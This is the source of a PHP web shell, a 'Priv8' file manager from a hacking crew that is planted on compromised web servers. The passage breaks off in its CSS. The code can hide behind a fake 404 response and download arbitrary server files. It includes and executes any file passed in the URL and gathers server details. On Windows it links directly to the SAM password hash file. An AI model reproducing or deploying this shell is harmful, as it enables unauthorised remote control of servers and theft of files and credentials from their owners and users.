<?PHP
/* 
ver=5
----------------------Only For Priv8 Use---------------------------------
               I dont support illegal actions!
-------------------------------------------------------------------------
          dC3 Security Crew
-------------------------------------------------------------------------
By turning "on" safe you can make your shell in 404 Not Find mode if the user doesnt know your OWN set word!
-------------------------------------------------------------------------
Shell written by Bl0od3r
-------------------------------------------------------------------------
Easy file managing with a lot of features!
-------------------------------------------------------------------------
In work:
special file options
-------------------------------------------------------------------------
*/
//important
error_reporting(5);
@ignore_user_abort(true);
//

$safe="off";
$word="secret";
if ($safe=="on") {
if (!isset($_GET[$word])) {
   header('HTTP/1.0 404 Not Found');
   exit;
   }
 }
$made_by="Bl0od3r";
$of="Netplayazz";
($made_by=="Bl0od3r") ? $fake=0 : $fake=1;
($of=="dc3") ? $fake=0 :  $fake=1;
$st_dir=".";
$p=str_replace("\\","/",realpath($_GET['file']));
$j_d=$_GET['file'];
$j_f=$_GET['file'];
$filename = $_GET['file'];
$file_info = pathinfo($filename);
$extn = $file_info['extension'];


if (isset($_GET['dir'])) {
 $images = array(
"download"=>
"R0lGODlhFAAUALMIAAD/AACAAIAAAMDAwH9/f/8AAP///wAAAP///wAAAAAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAgALAAAAAAUABQAAAROEMlJq704UyGOvkLhfVU4kpOJSpx5nF9YiCtLf0SuH7pu".
"EYOgcBgkwAiGpHKZzB2JxADASQFCidQJsMfdGqsDJnOQlXTP38przWbX3qgIADs=",
"ext_wri"=>
"R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAICAgMDAwICAAAAAgAAA////AAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARRUMhJkb0C6K2HuEiRcdsAfKExkkDgBoVxstwAAypduoao".
"a4SXT0c4BF0rUhFAEAQQI9dmebREW8yXC6Nx2QI7LrYbtpJZNsxgzW6nLdq49hIBADs=",
"small_dir"=>
"R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp".
"/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=",
"dir"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAkFBMVEX////MmTT/zGezgRvLmDN/
f3/AjSi6hyK9iiWgbghra2vCjyr/5oGufBbHlC+jcQuwfhiIiIjJljGcagS1gh24hSCebAaZZwGa
aAK0gRzvvFfcqUT4xWC8iSRKSkqreRPCwsK/jCeodhDms06lcw23hB/ToDv/1G//4HvFki3/64X/
95Fqamr//////5n/9I54UBIWAAAAAXRSTlMAQObYZgAAAAFiS0dELc3aQT0AAAAWdEVYdFNvZnR3
YXJlAGdpZjJwbmcgMi40LjakM4MXAAAAiUlEQVR42oXOxxKCMBgE4CWhVwEp9i4Ekt/3fzuDE0Yd
D3633dnDAr8su0i/stKi40cmTfnebckXU2GPj8k0U0mui2KIxYu7q1acA2kv1CxWWQ7RWTTbUhAi
YjaNxppqCZcJGowLlRI+O1FvbKiV8FhFnXGnJgT0n+RwvmZBXbbN3tFPHPnm4L8nl3EWVP90I8IA
AAAASUVORK5CYII=",
"o.b" => "/9j/4AAQSkZJRgABAgAAZABkAAD/7AARRHVja3kAAQAEAAAAUAAA/+IMWElDQ19QUk9GSUxFAAEB
AAAMSExpbm8CEAAAbW50clJHQiBYWVogB84AAgAJAAYAMQAAYWNzcE1TRlQAAAAASUVDIHNSR0IA
AAAAAAAAAAAAAAEAAPbWAAEAAAAA0y1IUCAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAARY3BydAAAAVAAAAAzZGVzYwAAAYQAAABsd3RwdAAAAfAAAAAUYmtw
dAAAAgQAAAAUclhZWgAAAhgAAAAUZ1hZWgAAAiwAAAAUYlhZWgAAAkAAAAAUZG1uZAAAAlQAAABw
ZG1kZAAAAsQAAACIdnVlZAAAA0wAAACGdmlldwAAA9QAAAAkbHVtaQAAA/gAAAAUbWVhcwAABAwA
AAAkdGVjaAAABDAAAAAMclRSQwAABDwAAAgMZ1RSQwAABDwAAAgMYlRSQwAABDwAAAgMdGV4dAAA
AABDb3B5cmlnaHQgKGMpIDE5OTggSGV3bGV0dC1QYWNrYXJkIENvbXBhbnkAAGRlc2MAAAAAAAAA
EnNSR0IgSUVDNjE5NjYtMi4xAAAAAAAAAAAAAAASc1JHQiBJRUM2MTk2Ni0yLjEAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAADzUQABAAAA
ARbMWFlaIAAAAAAAAAAAAAAAAAAAAABYWVogAAAAAAAAb6IAADj1AAADkFhZWiAAAAAAAABimQAA
t4UAABjaWFlaIAAAAAAAACSgAAAPhAAAts9kZXNjAAAAAAAAABZJRUMgaHR0cDovL3d3dy5pZWMu
Y2gAAAAAAAAAAAAAABZJRUMgaHR0cDovL3d3dy5pZWMuY2gAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZGVzYwAAAAAAAAAuSUVDIDYxOTY2LTIuMSBEZWZhdWx0
IFJHQiBjb2xvdXIgc3BhY2UgLSBzUkdCAAAAAAAAAAAAAAAuSUVDIDYxOTY2LTIuMSBEZWZhdWx0
IFJHQiBjb2xvdXIgc3BhY2UgLSBzUkdCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGRlc2MAAAAAAAAA
LFJlZmVyZW5jZSBWaWV3aW5nIENvbmRpdGlvbiBpbiBJRUM2MTk2Ni0yLjEAAAAAAAAAAAAAACxS
ZWZlcmVuY2UgVmlld2luZyBDb25kaXRpb24gaW4gSUVDNjE5NjYtMi4xAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAB2aWV3AAAAAAATpP4AFF8uABDPFAAD7cwABBMLAANcngAAAAFYWVogAAAAAABM
CVYAUAAAAFcf521lYXMAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAKPAAAAAnNpZyAAAAAAQ1JU
IGN1cnYAAAAAAAAEAAAAAAUACgAPABQAGQAeACMAKAAtADIANwA7AEAARQBKAE8AVABZAF4AYwBo
AG0AcgB3AHwAgQCGAIsAkACVAJoAnwCkAKkArgCyALcAvADBAMYAywDQANUA2wDgAOUA6wDwAPYA
+wEBAQcBDQETARkBHwElASsBMgE4AT4BRQFMAVIBWQFgAWcBbgF1AXwBgwGLAZIBmgGhAakBsQG5
AcEByQHRAdkB4QHpAfIB+gIDAgwCFAIdAiYCLwI4AkECSwJUAl0CZwJxAnoChAKOApgCogKsArYC
wQLLAtUC4ALrAvUDAAMLAxYDIQMtAzgDQwNPA1oDZgNyA34DigOWA6IDrgO6A8cD0wPgA+wD+QQG
BBMEIAQtBDsESARVBGMEcQR+BIwEmgSoBLYExATTBOEE8AT+BQ0FHAUrBToFSQVYBWcFdwWGBZYF
pgW1BcUF1QXlBfYGBgYWBicGNwZIBlkGagZ7BowGnQavBsAG0QbjBvUHBwcZBysHPQdPB2EHdAeG
B5kHrAe/B9IH5Qf4CAsIHwgyCEYIWghuCIIIlgiqCL4I0gjnCPsJEAklCToJTwlkCXkJjwmkCboJ
zwnlCfsKEQonCj0KVApqCoEKmAquCsUK3ArzCwsLIgs5C1ELaQuAC5gLsAvIC+EL+QwSDCoMQwxc
DHUMjgynDMAM2QzzDQ0NJg1ADVoNdA2ODakNww3eDfgOEw4uDkkOZA5/DpsOtg7SDu4PCQ8lD0EP
Xg96D5YPsw/PD+wQCRAmEEMQYRB+EJsQuRDXEPURExExEU8RbRGMEaoRyRHoEgcSJhJFEmQShBKj
EsMS4xMDEyMTQxNjE4MTpBPFE+UUBhQnFEkUahSLFK0UzhTwFRIVNBVWFXgVmxW9FeAWAxYmFkkW
bBaPFrIW1hb6Fx0XQRdlF4kXrhfSF/cYGxhAGGUYihivGNUY+hkgGUUZaxmRGbcZ3RoEGioaURp3
Gp4axRrsGxQbOxtjG4obshvaHAIcKhxSHHscoxzMHPUdHh1HHXAdmR3DHeweFh5AHmoelB6+Hukf
Ex8+H2kflB+/H+ogFSBBIGwgmCDEIPAhHCFIIXUhoSHOIfsiJyJVIoIiryLdIwojOCNmI5QjwiPw
JB8kTSR8JKsk2iUJJTglaCWXJccl9yYnJlcmhya3JugnGCdJJ3onqyfcKA0oPyhxKKIo1CkGKTgp
aymdKdAqAio1KmgqmyrPKwIrNitpK50r0SwFLDksbiyiLNctDC1BLXYtqy3hLhYuTC6CLrcu7i8k
L1ovkS/HL/4wNTBsMKQw2zESMUoxgjG6MfIyKjJjMpsy1DMNM0YzfzO4M/E0KzRlNJ402DUTNU01
hzXCNf02NzZyNq426TckN2A3nDfXOBQ4UDiMOMg5BTlCOX85vDn5OjY6dDqyOu87LTtrO6o76Dwn
PGU8pDzjPSI9YT2hPeA+ID5gPqA+4D8hP2E/oj/iQCNAZECmQOdBKUFqQaxB7kIwQnJCtUL3QzpD
fUPARANER0SKRM5FEkVVRZpF3kYiRmdGq0bwRzVHe0fASAVIS0iRSNdJHUljSalJ8Eo3Sn1KxEsM
S1NLmkviTCpMcky6TQJNSk2TTdxOJU5uTrdPAE9JT5NP3VAnUHFQu1EGUVBRm1HmUjFSfFLHUxNT
X1OqU/ZUQlSPVNtVKFV1VcJWD1ZcVqlW91dEV5JX4FgvWH1Yy1kaWWlZuFoHWlZaplr1W0VblVvl
XDVchlzWXSddeF3JXhpebF69Xw9fYV+zYAVgV2CqYPxhT2GiYfViSWKcYvBjQ2OXY+tkQGSUZOll
PWWSZedmPWaSZuhnPWeTZ+loP2iWaOxpQ2maafFqSGqfavdrT2una/9sV2yvbQhtYG25bhJua27E
bx5veG/RcCtwhnDgcTpxlXHwcktypnMBc11zuHQUdHB0zHUodYV14XY+dpt2+HdWd7N4EXhueMx5
KnmJeed6RnqlewR7Y3vCfCF8gXzhfUF9oX4BfmJ+wn8jf4R/5YBHgKiBCoFrgc2CMIKSgvSDV4O6
hB2EgITjhUeFq4YOhnKG14c7h5+IBIhpiM6JM4mZif6KZIrKizCLlov8jGOMyo0xjZiN/45mjs6P
No+ekAaQbpDWkT+RqJIRknqS45NNk7aUIJSKlPSVX5XJljSWn5cKl3WX4JhMmLiZJJmQmfyaaJrV
m0Kbr5wcnImc951kndKeQJ6unx2fi5/6oGmg2KFHobaiJqKWowajdqPmpFakx6U4pammGqaLpv2n
bqfgqFKoxKk3qamqHKqPqwKrdavprFys0K1ErbiuLa6hrxavi7AAsHWw6rFgsdayS7LCszizrrQl
tJy1E7WKtgG2ebbwt2i34LhZuNG5SrnCuju6tbsuu6e8IbybvRW9j74KvoS+/796v/XAcMDswWfB
48JfwtvDWMPUxFHEzsVLxcjGRsbDx0HHv8g9yLzJOsm5yjjKt8s2y7bMNcy1zTXNtc42zrbPN8+4
0DnQutE80b7SP9LB00TTxtRJ1MvVTtXR1lXW2Ndc1+DYZNjo2WzZ8dp22vvbgNwF3IrdEN2W3hze
ot8p36/gNuC94UThzOJT4tvjY+Pr5HPk/OWE5g3mlucf56noMui86Ubp0Opb6uXrcOv77IbtEe2c
7ijutO9A78zwWPDl8XLx//KM8xnzp/Q09ML1UPXe9m32+/eK+Bn4qPk4+cf6V/rn+3f8B/yY/Sn9
uv5L/tz/bf///+4AJkFkb2JlAGTAAAAAAQMAFQQDBgoNAAARtgAAF0YAABuaAAAgJv/bAIQAAgIC
AgICAgICAgMCAgIDBAMCAgMEBQQEBAQEBQYFBQUFBQUGBgcHCAcHBgkJCgoJCQwMDAwMDAwMDAwM
DAwMDAEDAwMFBAUJBgYJDQsJCw0PDg4ODg8PDAwMDAwPDwwMDAwMDA8MDAwMDAwMDAwMDAwMDAwM
DAwMDAwMDAwMDAwM/8IAEQgAHgK8AwERAAIRAQMRAf/EALsAAQACAwEBAAAAAAAAAAAAAAADBQIE
BgEHAQEAAAAAAAAAAAAAAAAAAAAAEAACAgMBAQADAQEBAAAAAAAAEwQFAiIDARQREhWAIyQRAAAE
BQIDBwMBBwUAAAAAAAABAgMx0ZMENBEhEhMzQVFhkZLS4nGBIuEQQKGxYmMUMkKiIyQSAQAAAAAA
AAAAAAAAAAAAAIATAAIBAgYDAAIDAQEAAAAAAAERACFRMUFhodHxEHGR8IFQgMGxMP/aAAwDAQAC
EQMRAAAB+DlmAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADmDnDbAAAAAAAAANg+hkJr
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
kASVTK8FiNrM/AhGUmWFC84tGEEIJ5RFIeaZNEkqJGAtGH9aGVEkQK9iYINvSQJEWxHx2GpQBhIZ
Bwa5prvsetQWpqEgLI4+OzcwGApE5roM4Eu/YDCCBAMieFfBZSsOoDACQEHAbkYf0IZUWIX6nQJO
w62AFEGLNU+OxSbDMMAANgOKD/1AqpAOSsWwMaELlEEQCYKpJE9qwuJkvAWgb+ClcKADkz4Up5Qz
TxEJQAcyJrvsqBdIAhhBpJzmdAkR8IeVKsg9DCCV0agEguPOgXgsWiK8GNikQ4KIUpBfAIBQg4hg
UfXgsdzaMhkEYAkEs+4YONNACBEVI48oB1UQAmcCjixmu+zXfZrvs132a77Nd9mu+zXfZrvs132a
77Nd9mu+zXfZrvs132a77M4vHcD0bsgCNLS0tLS0tLS0tLS0tLS0tLS0tIQCaCCAiIIRIYxgGAAE
DASu6kMCYrUEwf3KKyAa4AFNgEfJ07XjXnEUNgCkGnjzgoF87YASAqpafa6qSEAUEPAOQwIwUTBq
M4GXOYNycAq0VeCVEHAwaqASwJA3vKOkSCoKklVYxMho3wRgMTBArTKiAKJDmW1ZMYNg04tgNRQA
GRfqJaO7aLDIEaRCItkwsQioJeCRUlgMCuoUccoQc7MHmIirHwSa3ykQMExEkVRUH0VJkoAfoePN
LB4gFFJyQcCcfBIXbhwohAYUGGRgsMQ9QNhxcYrSACA4olyporJJQTAYmCrSWztEgkcivHkkjWVT
KECVLCNI5BU2AAEisiJBB8eTTWGAFQEBAOhizrgQGlgEml44rQwwYrgUMIDTlBFQzCyW1RRpsEBM
llACB+vB1rBwQDohIMs84NBEfCBQcNho4ThDyEQUlvwUCNLS0tLS0tLS0tLS0tLS0tLS32X3K0CG
YwXud1yndcp3XKd1yndcp3XKd1yndcp3XKd1yndcp3XKd1yndcp3XKd1yndcp3XKd1yndcp3XKd1
yndcp3XKd1yndcp3XKd1yndcp3XKd1yndcp3XKd1yndcp3XKd1yndcp3XKd1yndcp3XKd1yndcp3
XKd1yndcp3XKd1yndcp3XKd1yndcp3XKd1yndcp3XKd1yndcp3XKd1yndcp3XKd1yndcp3XKd1yn
dcp3XKd1yndcp3XKd1yndcp3XKd1yndcp3XKd1yndcp3XKd1yndcp3XKd1yndcpi/Yhm9z//2gAI
AQIDAT8Q/rB//9oACAEDAwE/EP6wf//Z");
  header("Content-type: image/gif");
  header("Cache-control: public");
  header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
  header("Cache-control: max-age=".(60*60*24*7));
  header("Last-Modified: ".date("r",filemtime(__FILE__)));
  echo base64_decode($images[$_GET['pic']]);
}

$ps=str_replace("\\","/",getenv('DOCUMENT_ROOT'));
//file_array
$file_tps=array(
"img"=>array("jpg","bmp","gif","ico"),
"act" => array("edit","copy","download","delete"),
"zip" => array("gzip","zip","rar")
);
$surl_autofill_include = true; //If true then search variables with descriptors (URLs) and save it in SURL.

if ($surl_autofill_include and !$_REQUEST["c99sh_surl"]) {$include = "&"; foreach (explode("&",getenv("QUERY_STRING")) as $v) {$v = explode("=",$v); $name = urldecode($v[0]); $value = urldecode($v[1]); foreach (array("http://","https://","ssl://","ftp://","\\\\") as $needle) {if (strpos($value,$needle) === 0) {$includestr .= urlencode($name)."=".urlencode($value)."&";}}} if ($_REQUEST["surl_autofill_include"]) {$includestr .= "surl_autofill_include=1&";}}
if (empty($surl))
{
 $surl = "?".$includestr; //Self url
}
$surl = htmlspecialchars($surl);
 @ob_clean();
//end
if (isset($_GET['img'])) {
   for ($i=0;$i<4;$i++) {
     if (preg_match("/".$file_tps["img"][$i]."/i",$extn)) {
    header("Content-type: ".$inf["mime"]);
    readfile(urldecode($filename));
    exit;

     }
 }
}


if (!function_exists(download)) {
   function download($file) {
   header('Pragma: anytextexeptno-cache', true);
      header('Content-type: application/force-download');
          header('Content-Transfer-Encoding: Binary');
              header('Content-length: '.filesize($file));
                  header('Content-disposition: attachment;
                      filename='.basename($file));
                          readfile($file);
                          exit;
   }
}
if (isset($_GET['download'])) {
download($filename);
exit;
}

if (isset($_GET['run'])) {
echo urldecode($_GET['file']);
include(urldecode($_GET['file']));
exit;
}


function check_update() 
{
$cur_ver=5; //very important value for updates!Please dont change!
$newer=$cur_ver+1;
$url="http://dc3.dl.am/";
$file=@fopen($url."".$newer.".txt","r") or die ("No updates aviable!");
$text=fread($file,1000000);
if (preg_match("/ver=".$newer."/i", $text)) {
   echo "[+]Update Aviable!...Please download new version from:";
echo "<br><a href=".$url.$newer.".txt>Version ".$newer."</a>";
} }

function get_perms($mode)
{
 if (($mode & 0xC000) === 0xC000) {$type = "s";}
 elseif (($mode & 0x4000) === 0x4000) {$type = "d";}
 elseif (($mode & 0xA000) === 0xA000) {$type = "l";}
 elseif (($mode & 0x8000) === 0x8000) {$type = "-";}
 elseif (($mode & 0x6000) === 0x6000) {$type = "b";}
 elseif (($mode & 0x2000) === 0x2000) {$type = "c";}
 elseif (($mode & 0x1000) === 0x1000) {$type = "p";}
 else {$type = "?";}

 $owner["read"] = ($mode & 00400)?"r":"-";
 $owner["write"] = ($mode & 00200)?"w":"-";
 $owner["execute"] = ($mode & 00100)?"x":"-";
 $group["read"] = ($mode & 00040)?"r":"-";
 $group["write"] = ($mode & 00020)?"w":"-";
 $group["execute"] = ($mode & 00010)?"x":"-";
 $world["read"] = ($mode & 00004)?"r":"-";
 $world["write"] = ($mode & 00002)? "w":"-";
 $world["execute"] = ($mode & 00001)?"x":"-";

 if ($mode & 0x800) {$owner["execute"] = ($owner["execute"] == "x")?"s":"S";}
 if ($mode & 0x400) {$group["execute"] = ($group["execute"] == "x")?"s":"S";}
 if ($mode & 0x200) {$world["execute"] = ($world["execute"] == "x")?"t":"T";}

echo  $type.join("",$owner).join("",$group).join("",$world);
}



if (!function_exists(get_space)) {
   function get_space($dir) {
$free = @diskfreespace($dir);
if (!$free) {$free = 0;}
$all = @disk_total_space($dir);
if (!$all) {$all = 0;}
$used = $all-$free;
$used_f = @round(48.7/($all/$free),2);
echo "".$used_f."";
     }
 }
$sys=strtolower(substr(PHP_OS,0,3));
echo "<center><table border=\"1\" width=600 rules=\"groups\">

  <thead>
    <tr><td>";
echo "<img  src=".$surl."?&".$word."&dir&pic=o.b height= width=>";
echo getenv('SERVER_SOFTWARE');
echo "<br>";
echo getenv('SERVER_NAME');
echo ":";
echo getenv('SERVER_PORT');
echo "<br>";
echo getenv('SERVER_ADMIN');

if ($sys=="win") {
echo "Windows";
echo "<br>";
echo  "".getenv('COMPUTERNAME')."";
echo "<br>";
echo "Os:".getenv('OS')."";
} else {
echo "<br>Linux";
}
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
$safe=1;
echo "<br><font color=red>ON (secure)</font>";
 } else {
$save=2;
if ($sys=="win") {
echo "<br><font color=green><a href=".$surl."?&".$word."&file_browser&file=C:/Windows/repair/sam&download>Off (not secure)</a></font>";
}
}
if (isset($_GET['file']))  {
echo "<br>Access:";
if (@is_readable($j_f)) {
   echo "R";
}
if (@is_executable($j_f)) {
 echo "E";
}
if (@is_writable($j_d)) {
echo "W";
}
echo "<br>Current_file:";
echo "<a href=".$surl."?&".$word."&file_browser&file=";
echo urlencode($p) ;
echo ">".$p."</a>";
 }
echo "<br>";
echo "Start_dir:";
echo "&ensp;&ensp;&ensp;";
echo "<a href=".$surl."?&".$word."&file_browser&file=";
echo urlencode($ps);
echo ">".$ps."</a>";
echo "<br>";
if (isset($_GET['file'])) {
echo "Free Space:";
get_space(urldecode($_GET['file']));

echo "gb";
}
echo "</td>";
?>

<style type="text/css">
body { background-color:#8B8989;font-family:trebuchet Ms; color:black }

textarea {
border-top-width: 1px; 
